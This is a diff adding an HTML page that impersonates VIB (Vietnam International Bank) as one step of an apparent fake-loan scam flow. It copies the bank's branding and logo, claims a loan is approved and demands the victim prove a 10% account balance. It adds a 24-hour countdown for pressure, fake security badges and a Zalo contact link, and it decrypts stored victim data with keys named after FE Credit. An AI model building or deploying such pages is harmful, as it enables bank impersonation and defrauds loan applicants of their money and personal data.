@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+    <title>Đăng ký thành công - VIB (Vietnam International Bank)</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet" />
+    <!-- Google Font - Inter & Montserrat (Premium Look) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Montserrat:wght@600;700;800&display=swap" rel="stylesheet" />
+    
+    <style>
+        :root {
+            /* Hệ màu thương hiệu VIB */
+            --vib-blue-dark: #004990;     /* Xanh chủ đạo VIB */
+            --vib-blue-light: #0066B3;    /* Xanh bổ trợ */
+            --vib-orange: #FF6700;        /* Cam đặc trưng VIB */
+            --vib-orange-hover: #E05600;  
+            --success-green: #2ECC71;     /* Xanh lá thành công */
+            --neutral-dark: #1C2430;      /* Chữ tối */
+            --neutral-light: #F4F7FC;     /* Nền sáng */
+            --card-shadow: 0 10px 30px rgba(0, 73, 144, 0.08);
+            --transition-smooth: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        body {
+            background: linear-gradient(135deg, #E2EAF5 0%, #F4F7FC 100%);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            margin: 0;
+            color: var(--neutral-dark);
+        }
+
+        /* Container chính mượt mà, ôm sát thiết bị di động */
+        .success-box {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 30px 24px;
+            text-align: center;
+            max-width: 460px;
+            width: 100%;
+            box-shadow: var(--card-shadow);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            animation: slideUpFade 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes slideUpFade {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Vòng tròn tích thành công kiểu mới */
+        .tick-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--success-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            box-shadow: 0 8px 24px rgba(46, 204, 113, 0.3);
+            position: relative;
+            animation: pulseSuccess 2s infinite;
+        }
+
+        .tick-circle i {
+            color: white;
+            font-size: 42px;
+        }
+
+        @keyframes pulseSuccess {
+            0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.5); }
+            70% { box-shadow: 0 0 0 15px rgba(46, 204, 113, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); }
+        }
+
+        /* Khung Logo VIB */
+        .logo-container {
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Tiêu đề thanh lịch */
+        .title { 
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.45rem; 
+            font-weight: 700; 
+            color: var(--vib-blue-dark); 
+            margin-bottom: 20px; 
+            letter-spacing: -0.5px;
+        }
+
+        /* Thẻ thông tin khoản vay hiện đại */
+        .loan-card {
+            background: linear-gradient(135deg, #004990 0%, #0066B3 100%);
+            border-radius: 16px;
+            padding: 18px 20px;
+            color: white;
+            text-align: left;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 18px rgba(0, 73, 144, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loan-card::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+        }
+
+        .loan-card .card-label {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.85;
+            margin-bottom: 4px;
+        }
+
+        .loan-card .loan-amount { 
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.75rem; 
+            font-weight: 800; 
+            color: #ffffff; 
+            margin: 0;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .loan-card .card-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px dashed rgba(255, 255, 255, 0.25);
+            font-size: 0.8rem;
+            opacity: 0.9;
+        }
+
+        /* Khung nội dung điều kiện */
+        .message-container {
+            background: #F8FAFD;
+            padding: 20px;
+            border-radius: 16px;
+            text-align: left;
+            border: 1px solid #EBF1F9;
+            margin-bottom: 20px;
+        }
+
+        .message-text {
+            font-size: 0.92rem;
+            color: #3B4B61;
+            line-height: 1.65;
+        }
+
+        .highlight-blue {
+            color: var(--vib-blue-dark);
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            font-size: 1rem;
+        }
+
+        .highlight-orange {
+            color: var(--vib-orange);
+            font-weight: 700;
+        }
+
+        .bullet-point {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+            align-items: flex-start;
+        }
+
+        .bullet-point i {
+            color: var(--vib-orange);
+            font-size: 1rem;
+            margin-top: 2px;
+        }
+
+        .link-more {
+            color: var(--vib-blue-light);
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1px dashed var(--vib-blue-light);
+            transition: var(--transition-smooth);
+        }
+
+        .link-more:hover {
+            color: var(--vib-orange);
+            border-color: var(--vib-orange);
+        }
+
+        /* Widget Tính Toán Số Dư Thử Nghiệm */
+        .calc-widget {
+            background: #FFF5EE;
+            border: 1px solid #FFE0CC;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-top: 15px;
+            font-size: 0.88rem;
+        }
+
+        /* Hộp đếm ngược thời gian */
+        .countdown-box {
+            background: #FFF9F5;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--vib-orange);
+            margin-bottom: 22px;
+            border: 1px dashed var(--vib-orange);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+            width: 100%;
+        }
+
+        /* Khối các Nút Thao Tác */
+        .btn-action-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Hàng nút phụ */
+        .btn-secondary-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .btn-outline-custom {
+            background: #ffffff;
+            border: 1px solid #D2DFEE;
+            border-radius: 12px;
+            padding: 12px 6px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--vib-blue-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+        }
+
+        .btn-outline-custom:hover {
+            background: #EDF3FA;
+            border-color: var(--vib-blue-dark);
+            color: var(--vib-blue-dark);
+        }
+
+        /* Nút Liên hệ Hỗ Trợ Zalo thương hiệu VIB (dưới dạng mảng màu riêng) */
+        .btn-contact-zalo {
+            background: #007FFF; /* Màu xanh dịu */
+            color: white;
+            padding: 14px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 1rem;
+            transition: var(--transition-smooth);
+            box-shadow: 0 4px 12px rgba(0, 127, 255, 0.2);
+        }
+
+        .btn-contact-zalo:hover {
+            opacity: 0.9;
+            color: white;
+            transform: translateY(-1px);
+        }
+
+        /* Nút Xác Thực To Toàn Diện (Nút Hành Động Cam VIB) */
+        .btn-main {
+            background: var(--vib-orange);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            box-shadow: 0 6px 18px rgba(255, 103, 0, 0.25);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-main:hover {
+            background: var(--vib-orange-hover);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(255, 103, 0, 0.35);
+        }
+
+        /* Chân trang bảo mật */
+        .footer-secure {
+            margin-top: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            font-size: 0.75rem;
+            color: #8C9BAE;
+        }
+
+        .footer-secure span {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="success-box">
+        <!-- Vòng tròn trạng thái -->
+        <div class="tick-circle">
+            <i class="bi bi-check-lg"></i>
+        </div>
+
+        <!-- Logo VIB được vẽ chính xác bằng Vector SVG siêu sắc nét -->
+        <div class="logo-container">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 540 180" width="130" height="43">
+                <!-- VIB Orange Sails (3 cánh buồm vàng cam) -->
+                <g fill="#FF6700">
+                    <path d="M 52,90 C 52,65 67,46 80,42 C 73,58 71,76 75,90 C 79,104 87,116 98,124 C 83,122 52,110 52,90 Z" />
+                    <path d="M 90,40 C 105,53 112,71 112,90 C 112,109 105,127 90,140 C 99,127 103,109 103,90 C 103,71 99,53 90,40 Z" />
+                    <path d="M 128,90 C 128,110 97,122 82,124 C 93,116 101,104 105,90 C 109,76 107,58 100,42 C 113,46 128,65 128,90 Z" />
+                </g>
+                <!-- VIB Typography (Xanh đậm VIB) -->
+                <g fill="#004990">
+                    <!-- Chữ V -->
+                    <path d="M 165,45 L 195,135 L 221,135 L 251,45 L 222,45 L 208,100 L 194,45 Z" />
+                    <!-- Chữ I -->
+                    <rect x="268" y="45" width="25" height="90" rx="3" />
+                    <!-- Chữ B -->
+                    <path d="M 310,45 L 360,45 C 380,45 392,55 392,68 C 392,78 385,85 373,88 C 388,91 397,100 397,113 C 397,127 382,135 360,135 L 310,135 Z M 336,63 L 336,80 L 355,80 C 366,80 371,76 371,71.5 C 371,67 366,63 355,63 Z M 336,97 L 336,117 L 358,117 C 369,117 375,113 375,107 C 375,101 369,97 358,97 Z" />
+                </g>
+            </svg>
+        </div>
+
+        <h1 class="title">Đăng ký vay thành công!</h1>
+        
+        <!-- Thẻ Khoản Vay Điện Tử mới -->
+        <div class="loan-card">
+            <div class="card-label">Hạn mức phê duyệt sơ bộ</div>
+            <div class="loan-amount" id="loanAmount">Đang tải...</div>
+            <div class="card-meta">
+                <span>Mã số hồ sơ: <strong id="appCode">VIB-88645392</strong></span>
+                <span>Trạng thái: <strong class="text-warning">Chờ giải ngân</strong></span>
+            </div>
+        </div>
+
+        <!-- Khung Điều kiện -->
+        <div class="message-container">
+            <div class="message-text">
+                <div class="highlight-blue">
+                    <i class="bi bi-shield-check"></i> Điều kiện hoàn tất nhận tiền:
+                </div>
+                
+                <div class="bullet-point">
+                    <i class="bi bi-info-circle-fill"></i>
+                    <span>Sản phẩm vay tín chấp nhanh không thế chấp, Ngân hàng VIB yêu cầu bạn duy trì <strong>10% số dư</strong> trong tài khoản liên kết để xác minh khả năng thanh toán.</span>
+                </div>
+
+                <div class="bullet-point">
+                    <i class="bi bi-check-circle-fill"></i>
+                    <span>Số dư này chỉ cần để trong tài khoản của bạn, <strong>tuyệt đối không cần nạp hay chuyển khoản cho bất kỳ ai</strong>.</span>
+                </div>
+
+                <!-- Widget Tính Toán tự động số dư để khách tiện theo dõi -->
+                <div class="calc-widget">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <span>Số dư cần chứng minh (10%):</span>
+                        <strong class="highlight-orange" id="reqBalance">Tính toán...</strong>
+                    </div>
+                </div>
+
+                <div class="mt-3 text-center">
+                    <a href="https://bankervn.com/chung-minh-tai-chinh-vib/" class="link-more">Xem hướng dẫn chi tiết</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Đếm ngược -->
+        <div class="countdown-box">
+            <i class="bi bi-clock-history"></i>
+            Hồ sơ sẽ hết hạn sau: <span id="timer">--:--:--</span>
+        </div>
+
+        <!-- Nhóm nút hành động -->
+        <div class="btn-action-group">
+            <div class="btn-secondary-row">
+                <a href="/vib.com.vn/pages/step6.html" class="btn-outline-custom">
+                    <i class="bi bi-file-earmark-ruled-fill"></i> Hợp đồng vay
+                </a>
+                <a href="/vib.com.vn/pages/step7.html" class="btn-outline-custom">
+                    <i class="bi bi-shield-lock-fill"></i> Điều kiện giải ngân
+                </a>
+            </div>
+
+            <a href="https://zalo.me/1110564149470015951" target="_blank" class="btn-contact-zalo">
+                <i class="bi bi-chat-dots-fill"></i> Liên hệ
+            </a>
+
+            <button onclick="window.location.href='/vib.com.vn/pages/Evaluate-conditions.html'" class="btn-main">
+                Xác thực số dư 
+            </button>
+        </div>
+
+        <!-- Chân trang tăng cường độ tin cậy -->
+        <div class="footer-secure">
+            <span><i class="bi bi-shield-lock"></i> VIB Safe Security</span>
+            <span>•</span>
+            <span><i class="bi bi-patch-check"></i> PCI-DSS Secured</span>
+        </div>
+    </div>
+
+    <!-- CryptoJS Thư viện giải mã (đảm bảo tính năng giải mã hiện tại hoạt động bình thường) -->
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+        const ENCRYPTION_KEYS = ['fecredit-secret-key-v1', 'fecredit-secret-key'];
+
+        // Hàm sinh mã hồ sơ ngẫu nhiên cố định theo phiên làm việc
+        function getAppCode() {
+            let code = sessionStorage.getItem('vibAppCode');
+            if (!code) {
+                const rand = Math.floor(1000 + Math.random() * 9000);
+                code = `VIB-${rand}`;
+                sessionStorage.setItem('vibAppCode', code);
+            }
+            return code;
+        }
+
+        function decryptData(encrypted) {
+            for (let key of ENCRYPTION_KEYS) {
+                try {
+                    const bytes = CryptoJS.AES.decrypt(encrypted, key);
+                    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+                    if (decrypted) return JSON.parse(decrypted);
+                } catch (e) { continue; }
+            }
+            return null;
+        }
+
+        function initData() {
+            const raw = localStorage.getItem('userData');
+            const display = document.getElementById('loanAmount');
+            const reqBalanceEl = document.getElementById('reqBalance');
+            
+            document.getElementById('appCode').textContent = getAppCode();
+
+            if (!raw) {
+                display.textContent = "Đang cập nhật VNĐ";
+                reqBalanceEl.textContent = "Chờ cập nhật";
+                return;
+            }
+
+            const data = decryptData(raw);
+            if (data) {
+                const amount = data.loanAmount || data.registerAmount || data.amount;
+                if (amount) {
+                    const parsedAmount = parseInt(amount);
+                    display.textContent = parsedAmount.toLocaleString('vi-VN') + ' VNĐ';
+                    
+                    // Tính 10% số dư tối thiểu cần chứng minh
+                    const minBalance = Math.floor(parsedAmount * 0.1);
+                    reqBalanceEl.textContent = minBalance.toLocaleString('vi-VN') + ' VNĐ';
+                } else {
+                    display.textContent = "Chưa xác định";
+                    reqBalanceEl.textContent = "Chờ cập nhật";
+                }
+            }
+            
+            localStorage.setItem('currentStep', 'step8.html');
+            localStorage.setItem('applicationStatus', 'completed');
+        }
+
+        // --- Cải tiến logic đếm ngược không bị reset khi tải lại trang ---
+        function startTimer() {
+            const timerEl = document.getElementById('timer');
+            const storageKey = 'vib_timer_expiration';
+            let expirationTime = localStorage.getItem(storageKey);
+
+            // Nếu chưa có mốc thời gian hết hạn trong localStorage, tạo mới (24 giờ kể từ hiện tại)
+            if (!expirationTime) {
+                expirationTime = Date.now() + 24 * 60 * 60 * 1000;
+                localStorage.setItem(storageKey, expirationTime);
+            } else {
+                expirationTime = parseInt(expirationTime);
+            }
+
+            function updateTimer() {
+                const now = Date.now();
+                const diff = expirationTime - now;
+
+                // Nếu đã hết thời gian đếm ngược
+                if (diff <= 0) {
+                    timerEl.textContent = "00:00:00";
+                    clearInterval(interval);
+                    return;
+                }
+
+                // Tính toán số giờ, phút, giây còn lại
+                const totalSeconds = Math.floor(diff / 1000);
+                const h = Math.floor(totalSeconds / 3600);
+                const m = Math.floor((totalSeconds % 3600) / 60);
+                const s = totalSeconds % 60;
+
+                // Cập nhật giao diện
+                timerEl.textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }
+
+            // Gọi hàm ngay lập tức lần đầu để không bị trễ hiển thị mặc định
+            updateTimer();
+            const interval = setInterval(updateTimer, 1000);
+        }
+
+        window.onload = () => {
+            initData();
+            startTimer();
+        };
+    </script>
+</body>
+</html>
